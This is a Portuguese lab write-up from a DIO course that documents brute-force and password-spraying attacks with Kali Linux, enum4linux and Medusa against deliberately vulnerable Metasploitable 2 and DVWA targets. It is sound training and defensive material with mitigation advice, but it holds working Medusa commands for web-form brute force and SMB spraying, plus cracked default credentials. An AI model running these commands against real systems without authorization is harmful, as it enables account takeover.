# Desafio DIO — Ataques de Força Bruta com Kali Linux e Medusa

Documentação prática de um laboratório de testes de intrusão focado em **ataques de força bruta**, realizado como desafio do curso da [DIO](https://www.dio.me/). O objetivo foi simular cenários reais de ataque contra uma aplicação web vulnerável (DVWA) e um serviço de compartilhamento de arquivos (SMB), utilizando o **Kali Linux** e a ferramenta **Medusa**, e refletir sobre medidas de mitigação.

> ⚠️ **Aviso legal:** todos os testes foram realizados em um laboratório isolado (rede *host-only* do VirtualBox), contra máquinas intencionalmente vulneráveis (Metasploitable 2 / DVWA). Nunca execute técnicas de força bruta contra sistemas sem autorização explícita.

---

## 1. Objetivos

- Compreender ataques de força bruta em diferentes serviços (Web e SMB);
- Utilizar o Kali Linux e o Medusa para auditoria de segurança em ambiente controlado;
- Praticar enumeração de usuários (RID cycling / `enum4linux`) e *password spraying*;
- Documentar o processo técnico de forma clara, com comandos e evidências;
- Propor recomendações de mitigação para os problemas encontrados.

## 2. Ambiente de Laboratório

| Máquina | Função | Sistema | IP |
|---|---|---|---|
| Kali Linux 2026.1 | Atacante | Kali Linux | 192.168.56.x |
| Metasploitable 2 | Alvo vulnerável (Samba 3.0.20-Debian, DVWA) | Ubuntu/Linux | **192.168.56.101** |

- Virtualização: **Oracle VirtualBox**
- Rede: **Host-only Adapter** (isolada da internet e da rede do host)
- Ferramentas principais: `medusa`, `enum4linux`, `smbclient`, Firefox (DevTools) e o navegador padrão do Kali

A interface de rede do alvo foi confirmada com `ip a` dentro do próprio Metasploitable 2, retornando o endereço `192.168.56.101/24` na interface `eth0`.

---

## 3. Fase 1 — Reconhecimento e Enumeração (SMB)

Antes de atacar o serviço SMB, foi feita a enumeração de usuários do Samba com `enum4linux`, que permite sessão nula (`username ''`, `password ''`).

```bash
enum4linux 192.168.56.101
```

**Principais achados:**

- **Sistema operacional:** Samba 3.0.20-Debian;
- **Sessão nula permitida** (`Server ... allows sessions using username '', password ''`), o que já é uma falha de configuração grave;
- **Shares disponíveis:**

| Share | Tipo | Observação |
|---|---|---|
| `print$` | Disk | Acesso negado |
| `tmp` | Disk | Listagem permitida (comentário "oh noes!") |
| `opt` | Disk | Acesso negado |
| `IPC$` | IPC | Padrão |
| `ADMIN$` | IPC | Acesso negado |

- **Política de senha extraída via RPC:**
  - Complexidade de senha: **Desabilitada**
  - Tamanho mínimo de senha: **0**
  - Threshold de bloqueio de conta: **Não definido** (permite tentativas ilimitadas — habilita força bruta sem *lockout*)

- **Usuários enumerados via RID cycling** (RIDs 500–550 e 1000–1050), incluindo contas de sistema e, principalmente, a conta de interesse `msfadmin` (RID `0xbb8` / SID terminado em `-1000` a `-1050`). A lista completa de usuários extraídos está no arquivo [`enum4_output.txt`](./enum4_output.txt).

A partir dessa lista, foi criado um arquivo de usuários alvo para o ataque de SMB:

```bash
echo -e "user\nmsfadmin\nservice" > smb_users.txt
```

---

## 4. Fase 2 — Força Bruta em Formulário Web (DVWA)

### 4.1 Identificando os parâmetros do formulário

Usando o **Firefox DevTools (aba Network)**, foi inspecionada uma requisição de login na DVWA (`http://192.168.56.101/dvwa/index.php` → `login.php`) para identificar os campos do formulário enviados via `POST`:

```
username: admin
password: password
Login: Login
```

Essa informação foi essencial para montar corretamente o módulo `http` do Medusa.

### 4.2 Montando as wordlists

Arquivos simples de usuários (`user.txt`) e senhas (`pass.txt`) foram criados com candidatos comuns (ex.: `123456`, `password`, `qwert`, usuários `root`, `user`, `msfadmin`).

### 4.3 Executando o ataque

```bash
medusa -h 192.168.56.101 -U user.txt -P pass.txt -M http \
  -m PAGE:'/dvwa/login.php' \
  -m FORM:'username=^USER^&password=^PASS^&login=Login' \
  -m 'FAIL=Login failed' \
  -t 6
```

- `-M http`: módulo de autenticação web;
- `-m PAGE`: caminho da página de login;
- `-m FORM`: template do corpo da requisição, com `^USER^` e `^PASS^` substituídos pelas credenciais testadas;
- `-m FAIL`: string usada para identificar tentativa malsucedida;
- `-t 6`: 6 threads simultâneas.

### 4.4 Resultados

O Medusa validou, de forma automatizada, as credenciais corretas dentro das wordlists testadas:

| Usuário | Senha | Resultado |
|---|---|---|
| `root` | `123456` | ✅ **SUCCESS** |
| `user` | `123456` | ✅ **SUCCESS** |
| `user` | `password` | ✅ **SUCCESS** |
| `user` | `qwert` | ✅ **SUCCESS** |
| `msfadmin` | `password` | ✅ **SUCCESS** |

A ausência de *rate limiting*, captcha e bloqueio de conta no DVWA (nível de segurança baixo) permitiu que todas as combinações fossem testadas em poucos segundos, sem qualquer restrição.

---

## 5. Fase 3 — Password Spraying em SMB

Com a lista de usuários obtida na enumeração (Fase 1) e um conjunto pequeno de senhas comuns, foi montado um ataque de **password spraying** (testar poucas senhas contra muitos usuários, reduzindo o risco de bloqueio de conta):

```bash
echo -e "user\nmsfadmin\nservice" > smb_users.txt
echo -e "password\n123456\nWelcome123\nmsfadmin" > senhas_spray.txt

medusa -h 192.168.56.101 -U smb_users.txt -P senhas_spray.txt -M smbnt -t 2 -T 50
```

- `-M smbnt`: módulo de autenticação SMB/NTLM;
- `-U` / `-P`: arquivos de usuários e senhas;
- `-t 2`: 2 threads por host (login);
- `-T 50`: 50 hosts em paralelo (não relevante aqui, pois há apenas 1 alvo).

### Resultado

```
ACCOUNT FOUND: [smbnt] Host: 192.168.56.101 User: msfadmin Password: msfadmin
  [SUCCESS (ADMIN$ - Access Allowed)]
```

A credencial **`msfadmin:msfadmin`** foi validada com sucesso, inclusive com acesso ao compartilhamento administrativo `ADMIN$`.

### Validando o acesso

O acesso foi confirmado manualmente com `smbclient`, listando os compartilhamentos disponíveis para o usuário comprometido:

```bash
smbclient -L //192.168.56.101 -U msfadmin
```

```
Sharename       Type      Comment
---------       ----      -------
print$          Disk      Printer Drivers
tmp             Disk      oh noes!
opt             Disk
IPC$            IPC       IPC Service (metasploitable server (Samba 3.0.20-Debian))
ADMIN$          IPC       IPC Service (metasploitable server (Samba 3.0.20-Debian))
msfadmin        Disk      Home Directories
```

Com a senha válida, o usuário `msfadmin` passou a enxergar também seu diretório pessoal (`msfadmin`, Home Directories), que antes (sessão nula) não era visível.

---

## 6. Evidências (Screenshots)

| # | Descrição |
|---|---|
| 1 | VMs em execução (Metasploitable 2 e Kali Linux) e confirmação do IP do alvo (`ip a`) |
| 2 | Comando Medusa configurado para o ataque HTTP contra a DVWA |
| 3 | Saída do Medusa com as credenciais encontradas (`SUCCESS`) no ataque web |
| 4 | DevTools do Firefox mostrando os campos do formulário de login da DVWA |
| 5 | Saída do `enum4linux` com a lista de usuários enumerados via RID cycling |
| 6 | Criação das wordlists `smb_users.txt` e `senhas_spray.txt` |
| 7 | Comando Medusa configurado para o password spraying em SMB (`smbnt`) |
| 8 | Saída do Medusa com a credencial `msfadmin:msfadmin` validada (`ADMIN$` liberado) |
| 9 | Validação manual do acesso com `smbclient -L` |

> As imagens originais e o log completo do `enum4linux` (`enum4_output.txt`) estão incluídos neste repositório.

---

## 7. Recomendações de Mitigação

### Para aplicações web (DVWA/login em geral)
- Implementar **bloqueio de conta (lockout)** após um número limitado de tentativas falhas;
- Adicionar **CAPTCHA** ou desafios anti-automação após algumas tentativas;
- Aplicar **rate limiting** por IP/usuário;
- Exigir **MFA (autenticação em dois fatores)**;
- Usar **políticas de senha forte** e banir senhas comuns (ex.: `123456`, `password`);
- Monitorar e alertar sobre picos de tentativas de login (SIEM/logs).

### Para serviços SMB/Samba
- **Desabilitar sessões nulas** (`restrict anonymous` / `null sessions`);
- Definir **política de senha forte** com complexidade obrigatória e tamanho mínimo adequado;
- Configurar **threshold de bloqueio de conta** para impedir tentativas ilimitadas;
- Restringir acesso aos compartilhamentos administrativos (`ADMIN$`, `C$`) e segmentar a rede;
- Manter o Samba atualizado (a versão 3.0.20 utilizada no laboratório é extremamente antiga e possui vulnerabilidades conhecidas);
- Monitorar tentativas de autenticação e volumetria de logins (detecção de *password spraying*).

### Boas práticas gerais
- Nunca reutilizar credenciais padrão/fracas em ambientes reais;
- Realizar testes de força bruta **apenas** em ambientes autorizados e isolados;
- Revisar periodicamente usuários e permissões concedidas aos serviços expostos.

---

## 8. Conclusão

O laboratório demonstrou, na prática, como configurações padrão fracas (senhas simples, ausência de *lockout*, sessões nulas habilitadas) tornam serviços web e SMB extremamente vulneráveis a ataques automatizados de força bruta e *password spraying*, mesmo usando ferramentas simples e wordlists pequenas. A combinação de **enumeração prévia de usuários** (`enum4linux`) com um ataque de *spraying* direcionado reduziu drasticamente o esforço necessário para comprometer uma conta válida, reforçando a importância de políticas de senha, bloqueio de contas e monitoramento ativo em qualquer serviço exposto.

---

## 9. Referências

- [DIO - Digital Innovation One](https://www.dio.me/)
- [Medusa - Foofus Networks](http://foofus.net/goons/jmk/medusa/medusa.html)
- [enum4linux](https://github.com/CiscoCXSecurity/enum4linux)
- [Damn Vulnerable Web Application (DVWA)](https://github.com/digininja/DVWA)
- [Metasploitable 2](https://docs.rapid7.com/metasploit/metasploitable-2/)
